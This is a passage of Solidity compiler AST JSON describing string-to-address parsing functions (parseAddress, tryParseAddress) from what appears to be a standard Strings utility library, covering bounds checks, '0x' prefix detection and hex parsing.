bool"}},"visibility":"internal"},{"constant":false,"id":1251,"mutability":"mutable","name":"value","nameLocation":"14505:5:3","nodeType":"VariableDeclaration","scope":1266,"src":"14497:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1250,"name":"address","nodeType":"ElementaryTypeName","src":"14497:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":1257,"initialValue":{"arguments":[{"id":1253,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1239,"src":"14530:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":1254,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1241,"src":"14537:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1255,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1243,"src":"14544:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1252,"name":"tryParseAddress","nodeType":"Identifier","overloadedDeclarations":[1288,1392],"referencedDeclaration":1392,"src":"14514:15:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_address_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,address)"}},"id":1256,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14514:34:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_address_$","typeString":"tuple(bool,address)"}},"nodeType":"VariableDeclarationStatement","src":"14482:66:3"},{"condition":{"id":1259,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"14562:8:3","subExpression":{"id":1258,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1249,"src":"14563:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1263,"nodeType":"IfStatement","src":"14558:50:3","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1260,"name":"StringsInvalidAddressFormat","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":295,"src":"14579:27:3","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$_t_error_$","typeString":"function () pure returns (error)"}},"id":1261,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14579:29:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":1262,"nodeType":"RevertStatement","src":"14572:36:3"}},{"expression":{"id":1264,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1251,"src":"14625:5:3","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1247,"id":1265,"nodeType":"Return","src":"14618:12:3"}]},"documentation":{"id":1237,"nodeType":"StructuredDocumentation","src":"14105:259:3","text":" @dev Variant of {parseAddress-string} that parses a substring of `input` located between position `begin` (included) and\n `end` (excluded).\n Requirements:\n - The substring must be formatted as `(0x)?[0-9a-fA-F]{40}`"},"id":1267,"implemented":true,"kind":"function","modifiers":[],"name":"parseAddress","nameLocation":"14378:12:3","nodeType":"FunctionDefinition","parameters":{"id":1244,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1239,"mutability":"mutable","name":"input","nameLocation":"14405:5:3","nodeType":"VariableDeclaration","scope":1267,"src":"14391:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1238,"name":"string","nodeType":"ElementaryTypeName","src":"14391:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":1241,"mutability":"mutable","name":"begin","nameLocation":"14420:5:3","nodeType":"VariableDeclaration","scope":1267,"src":"14412:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1240,"name":"uint256","nodeType":"ElementaryTypeName","src":"14412:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1243,"mutability":"mutable","name":"end","nameLocation":"14435:3:3","nodeType":"VariableDeclaration","scope":1267,"src":"14427:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1242,"name":"uint256","nodeType":"ElementaryTypeName","src":"14427:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"14390:49:3"},"returnParameters":{"id":1247,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1246,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1267,"src":"14463:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1245,"name":"address","nodeType":"ElementaryTypeName","src":"14463:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"14462:9:3"},"scope":1631,"src":"14369:268:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1287,"nodeType":"Block","src":"14944:70:3","statements":[{"expression":{"arguments":[{"id":1278,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1270,"src":"14977:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":1279,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14984:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":1282,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1270,"src":"14993:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1281,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14987:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1280,"name":"bytes","nodeType":"ElementaryTypeName","src":"14987:5:3","typeDescriptions":{}}},"id":1283,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14987:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1284,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"15000:6:3","memberName":"length","nodeType":"MemberAccess","src":"14987:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1277,"name":"tryParseAddress","nodeType":"Identifier","overloadedDeclarations":[1288,1392],"referencedDeclaration":1392,"src":"14961:15:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_address_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,address)"}},"id":1285,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14961:46:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_address_$","typeString":"tuple(bool,address)"}},"functionReturnParameters":1276,"id":1286,"nodeType":"Return","src":"14954:53:3"}]},"documentation":{"id":1268,"nodeType":"StructuredDocumentation","src":"14643:198:3","text":" @dev Variant of {parseAddress-string} that returns false if the parsing fails because the input is not a properly\n formatted address. See {parseAddress-string} requirements."},"id":1288,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseAddress","nameLocation":"14855:15:3","nodeType":"FunctionDefinition","parameters":{"id":1271,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1270,"mutability":"mutable","name":"input","nameLocation":"14885:5:3","nodeType":"VariableDeclaration","scope":1288,"src":"14871:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1269,"name":"string","nodeType":"ElementaryTypeName","src":"14871:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"14870:21:3"},"returnParameters":{"id":1276,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1273,"mutability":"mutable","name":"success","nameLocation":"14920:7:3","nodeType":"VariableDeclaration","scope":1288,"src":"14915:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1272,"name":"bool","nodeType":"ElementaryTypeName","src":"14915:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1275,"mutability":"mutable","name":"value","nameLocation":"14937:5:3","nodeType":"VariableDeclaration","scope":1288,"src":"14929:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1274,"name":"address","nodeType":"ElementaryTypeName","src":"14929:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"14914:29:3"},"scope":1631,"src":"14846:168:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1391,"nodeType":"Block","src":"15407:733:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1312,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1308,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1302,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"15421:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":1305,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1291,"src":"15433:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1304,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15427:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1303,"name":"bytes","nodeType":"ElementaryTypeName","src":"15427:5:3","typeDescriptions":{}}},"id":1306,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15427:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1307,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"15440:6:3","memberName":"length","nodeType":"MemberAccess","src":"15427:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15421:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1311,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1309,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1293,"src":"15450:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":1310,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"15458:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15450:11:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"15421:40:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1320,"nodeType":"IfStatement","src":"15417:72:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":1313,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"15471:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"arguments":[{"hexValue":"30","id":1316,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15486:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1315,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15478:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1314,"name":"address","nodeType":"ElementaryTypeName","src":"15478:7:3","typeDescriptions":{}}},"id":1317,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15478:10:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":1318,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"15470:19:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_address_$","typeString":"tuple(bool,address)"}},"functionReturnParameters":1301,"id":1319,"nodeType":"Return","src":"15463:26:3"}},{"assignments":[1322],"declarations":[{"constant":false,"id":1322,"mutability":"mutable","name":"hasPrefix","nameLocation":"15505:9:3","nodeType":"VariableDeclaration","scope":1391,"src":"15500:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1321,"name":"bool","nodeType":"ElementaryTypeName","src":"15500:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"id":1345,"initialValue":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1344,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1327,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1323,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"15518:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1326,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1324,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1293,"src":"15524:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1325,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15532:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"15524:9:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15518:15:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"id":1328,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"15517:17:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_bytes2","typeString":"bytes2"},"id":1343,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"arguments":[{"arguments":[{"id":1334,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1291,"src":"15574:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1333,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15568:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1332,"name":"bytes","nodeType":"ElementaryTypeName","src":"15568:5:3","typeDescriptions":{}}},"id":1335,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15568:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1336,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1293,"src":"15582:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1331,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"15545:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":1337,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15545:43:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1330,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15538:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes2_$","typeString":"type(bytes2)"},"typeName":{"id":1329,"name":"bytes2","nodeType":"ElementaryTypeName","src":"15538:6:3","typeDescriptions":{}}},"id":1338,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15538:51:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes2","typeString":"bytes2"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"3078","id":1341,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"15600:4:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837","typeString":"literal_string \"0x\""},"value":"0x"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837","typeString":"literal_string \"0x\""}],"id":1340,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15593:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes2_$","typeString":"type(bytes2)"},"typeName":{"id":1339,"name":"bytes2","nodeType":"ElementaryTypeName","src":"15593:6:3","typeDescriptions":{}}},"id":1342,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15593:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes2","typeString":"bytes2"}},"src":"15538:67:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"15517:88:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"VariableDeclarationStatement","src":"15500:105:3"},{"assignments":[1347],"declarations":[{"constant":false,"id":1347,"mutability":"mutable","name":"expectedLength","nameLocation":"15694:14:3","nodeType":"VariableDeclaration","scope":1391,"src":"15686:22:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1346,"name":"uint256","nodeType":"ElementaryTypeName","src":"15686:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1355,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1354,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"3430","id":1348,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15711:2:3","typeDescriptions":{"typeIdentifier":"t_rational_40_by_1","typeString":"int_const 40"},"value":"40"},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1353,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":1349,"name":"hasPrefix","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1322,"src":"15716:9:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1350,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"15726:6:3","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"15716:16:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$attached_to$_t_bool_$","typeString":"function (bool) pure returns (uint256)"}},"id":1351,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15716:18:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"hexValue":"32","id":1352,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15737:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"15716:22:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15711:27:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"15686:52:3"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1360,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1358,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1356,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"15803:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":1357,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1293,"src":"15809:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15803:11:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":1359,"name":"expectedLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1347,"src":"15818:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15803:29:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1389,"nodeType":"Block","src":"16083:51:3","statements":[{"expression":{"components":[{"hexValue":"66616c7365","id":1382,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"16105:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"arguments":[{"hexValue":"30","id":1385,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16120:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1384,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16112:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1383,"name":"address","nodeType":"ElementaryTypeName","src":"16112:7:3","typeDescriptions":{}}},"id":1386,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16112:10:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":1387,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"16104:19:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_address_$","typeString":"tuple(bool,address)"}},"functionReturnParameters":1301,"id":1388,"nodeType":"Return","src":"16097:26:3"}]},"id":1390,"nodeType":"IfStatement","src":"15799:335:3","trueBody":{"id":1381,"nodeType":"Block","src":"15834:243:3","statements":[{"assignments":[1362,1364],"declarations":[{"constant":false,"id":1362,"mutability":"mutable","name":"s","nameLocation":"15955:1:3","nodeType":"VariableDeclaration","scope":1381,"src":"15950:6:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1361,"name":"bool","nodeType":"ElementaryTypeName","src":"15950:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1364,"mutability":"mutable","name":"v","nameLocation":"15966:1:3","nodeType":"VariableDeclaration","scope":1381,"src":"15958:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1363,"name":"uint256","nodeType":"ElementaryTypeName","src":"15958:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1370,"initialValue":{"arguments":[{"id":1366,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1291,"src":"16003:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":1367,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1293,"src":"16010:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1368,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"16017:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1365,"name":"_tryParseHexUintUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1217,"src":"15971:31:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":1369,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15971:50:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"15949:72:3"},{"expression":{"components":[{"id":1371,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1362,"src":"16043:1:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"arguments":[{"arguments":[{"id":1376,"name":"v","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1364,"src":"16062:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1375,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16054:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uin